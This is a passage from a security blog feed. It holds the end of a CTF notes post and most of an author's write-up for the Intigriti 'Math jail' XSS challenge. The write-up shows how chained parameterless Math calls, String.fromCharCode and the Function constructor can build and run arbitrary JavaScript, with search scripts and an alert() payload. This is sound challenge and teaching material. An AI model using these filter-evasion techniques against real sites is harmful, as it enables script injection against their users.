keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rate limit</span>        <span class="token keyword">await</span> <span class="token function">waitFor</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    runs<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">median</span><span class="token operator">:</span> <span class="token function">median</span><span class="token punctuation">(</span>runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">sum</span><span class="token operator">:</span> runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        runs    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When you send a large message to the iframe, the time it takes will be different.</p><p>Another team opened 1000 tabs and measured the network time. In hindsight, it seems quite reasonable. If the iframe has a status code of 200, it will generate a lot of requests, slowing down the network speed.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;I participated in both of these events to some extent, but I didn’t look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail.&lt;/p&gt;
&lt;p&gt;As usual, here are the keywords I noted:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;GraphQL batch query + alias&lt;/li&gt;
&lt;li&gt;Python os.path.join absolute path&lt;/li&gt;
&lt;li&gt;Svg XSS, foreignObject&lt;/li&gt;
&lt;li&gt;WebRTC CSP bypass&lt;/li&gt;
&lt;li&gt;Status code xsleak&lt;/li&gt;
&lt;li&gt;DNS rebinding&lt;/li&gt;
&lt;li&gt;nmap command injection&lt;/li&gt;
&lt;li&gt;Ruby rack file upload temporary storage&lt;/li&gt;
&lt;li&gt;buildConstraintViolationWithTemplate EL injection&lt;/li&gt;
&lt;li&gt;Request smuggling&lt;/li&gt;
&lt;li&gt;document.baseURI&lt;/li&gt;
&lt;li&gt;200&amp;#x2F;404 status code xsleak&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Math jail - Intigriti 0823 XSS Challenge Author Writeup</title>
    <link href="https://blog.huli.tw/2023/08/29/en/intigriti-0823-author-writeup/"/>
    <id>https://blog.huli.tw/2023/08/29/en/intigriti-0823-author-writeup/</id>
    <published>2023-08-29T06:10:44.000Z</published>
    <updated>2023-08-29T06:41:36.526Z</updated>
    
    <content type="html"><![CDATA[<p>In the monthly challenges at Intigriti, I presented an XSS challenge that I named “Math Jail.” You can find the challenge at the following link: <a href="https://challenge-0823.intigriti.io/">https://challenge-0823.intigriti.io/</a></p><p>Now that the challenge has concluded, I’d like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed.</p><span id="more"></span><p>The concept of “Math jail” originated from a challenge called “Culinary Class Room” in the Hack.lu CTF 2022. This challenge required adding numerous decorators to a Python class without any parameters, with the objective of executing arbitrary code.</p><p>Decorators are essentially function calls, which means you can only use code in the form of <code>a(b(c(d(e(f())))))</code>. How can one achieve the ability to execute any desired functionality?</p><p>Similar challenges have also appeared in Chinese CTF competitions, such as the one mentioned in this article: <a href="https://xz.aliyun.com/t/9360">PHP Parameterless RCE</a>.</p><p>The solution to the Culinary Class Room challenge involved finding a list, pushing multiple numbers into it, converting it to bytes, and then passing it to <code>eval()</code> for execution.</p><p>For example, the following code snippet would push the number 112 into <code>copyright._Printer__filenames</code>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span><span class="token decorator annotation punctuation">@memoryview<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__sub__</span><span class="token decorator annotation punctuation">@staticmethod<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__mul__</span><span class="token decorator annotation punctuation">@object<span class="token punctuation">.</span>__instancecheck__</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Upon encountering this challenge, I wondered if it would be possible to create a JavaScript version. That’s how Math jail came into existence.</p><p>Initially, there was no requirement for it to start with <code>Math.</code>, but later on, I found it more interesting to do so. Moreover, if it didn’t have this restriction, one could simply execute <code>alert(document.domain.toString())</code> and be done. Filtering out many keywords and potential unintended consequences would be necessary.</p><p>Now, let’s discuss the general approach to solving Math jail.</p><h2><span id="the-overall-concept-of-the-solution">The overall concept of the solution</span></h2><p>The concept is similar to the Python version mentioned earlier. We need to find a list, push elements into it, and then join the elements and pass them to <code>eval()</code> for execution. Here’s a general example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Uncaught ReferenceError: a is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>In the above code, the variable <code>a</code> is executed. By following this concept, we can construct <code>alert()</code>. Let’s take a simple example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>    <span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>          <span class="token string">')'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>              <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>                arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">)</span>          <span class="token punctuation">)</span>        <span class="token punctuation">)</span>      <span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Since each function call cannot have parameters, expressions like <code>arr.join(&#39;&#39;)</code> can be modified to <code>arr.join(&#39;&#39;.toString())</code> to comply with the rule.</p><p>Once we have this basic concept, the remaining questions can be divided into four parts:</p><ol><li>How do we find a usable array?</li><li>How do we find the desired characters?</li><li>How do we join them?</li><li>How do we execute without using eval?</li></ol><h2><span id="1-finding-an-array">1. Finding an array</span></h2><p>In the given challenge, there is a specific array called <code>Math.seeds</code>. By using the <code>pop()</code> method multiple times, we can empty the array. Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token comment">// []</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>This way, we have an empty array <code>Math.seeds</code> that we can use to store elements.</p><h2><span id="2-finding-the-desired-characters">2. Finding the desired characters</span></h2><p>Firstly, we can check if the desired characters exist within <code>Math</code>. For example, <code>Math.abs.name</code> gives us the string <code>&quot;abs&quot;</code>, and by using <code>.at()</code> on it, <code>Math.abs.name.at()</code> would be <code>&quot;a&quot;</code>.</p><p>Therefore, <code>Math.seeds.push(Math.abs.name.at())</code> would make the contents of <code>Math.seeds</code> become <code>[&quot;a&quot;]</code>.</p><p>The return value of <code>Array.prototype.push</code> is the length of the array. Hence, if we can find a function whose second letter is <code>&#39;l&#39;</code>, it would be optimal to reduce the number of function calls.</p><p>By now, you might have realized that manually solving this challenge would be tiresome. Automating the process would be a better approach. So, let’s write a function!</p><p>We can use recursion to explore each property of accessible objects and check if it meets our desired criteria. The function implementation is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You can use the function as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>We can also improve the usability by organizing it as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Earlier, we mentioned that we would first try to find the desired character by using the array’s length. But what if we can’t find it?</p><p>In that case, we can try another approach: finding it at a fixed index.</p><p>For example, <code>Math.LN2</code> is <code>0.69</code>, and when we pass a decimal number as an argument to <code>Array.prototype.at()</code>, it automatically rounds down to the nearest integer. So, it becomes <code>0</code>.</p><p>Suppose the original return value of <code>arr.push()</code> is 2. By wrapping it with <code>Math.LN2.valueOf(arr.push())</code>, we can convert the number back to 0, allowing us to use the first character to find the desired function name.</p><p>Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>This code will make the contents of the array become <code>[&#39;a&#39;, &#39;l&#39;]</code>.</p><p>Following this approach, we can prepare a few more indices. I have prepared four:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>  <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>  <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>  <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>At this point, we should be able to find all the English letters we need. But what about symbols like <code>()</code>? How do we handle those?</p><p>This is where we can recall the handy function <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">String.fromCharCode()</a>. It can convert a number into a corresponding character string.</p><p>To access <code>String</code> from <code>Math</code>, we can simply find any string and access its constructor, like <code>Math.abs.name.constructor.fromCharCode</code>.</p><p>Now, the question becomes, how do we generate numbers?</p><p>Since we are already using Math, let’s write a searching function that tries various combinations of Math functions!</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When we construct <code>alert</code>, the return value of the last push operation will be 5. Since the ASCII code for <code>(</code> is 40, we can obtain 40 with the following expression: <code>Math.floor(Math.log2(Math.cosh(Math.clz32(5))))</code>.</p><p>By concatenating it with the previous code, we can obtain <code>(</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">log2</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">cosh</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">clz32</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Putting it all together, we can form an array with the desired characters.</p><h2><span id="3-how-to-join-the-array">3. How to join the array?</span></h2><p>To join the array elements together, we need to find an empty string to transform the array into the desired string format.</p><p>Initially, my idea was to generate a whitespace character and use <code>&quot; &quot;.trim()</code>. However, this approach would involve function calls like <code>fn().trim()</code>, which violates the rules specified in the challenge.</p><p>Fortunately, there is another way to invoke functions: <code>String.prototype.trim.call(&quot; &quot;)</code>. This method allows us to obtain an empty string.</p><p>We can utilize the method we used earlier to find <code>(</code> to find the whitespace character. Finally, we can add this sequence of function calls to achieve the desired result. Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Assumed we already had the array</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// alert()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2><span id="4-how-to-execute-without-using-eval">4. How to execute without using eval?</span></h2><p>Besides <code>eval</code>, we can also use the function constructor, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>For the <code>Function</code> part, we can simply find any function and access its constructor:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>But what about the final <code>()</code>?</p><p>Similarly, we can invoke a function in another way. For example, <code>alert.call()</code> can be written as <code>Function.prototype.call.call(alert)</code>. Therefore, the code we need is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2><span 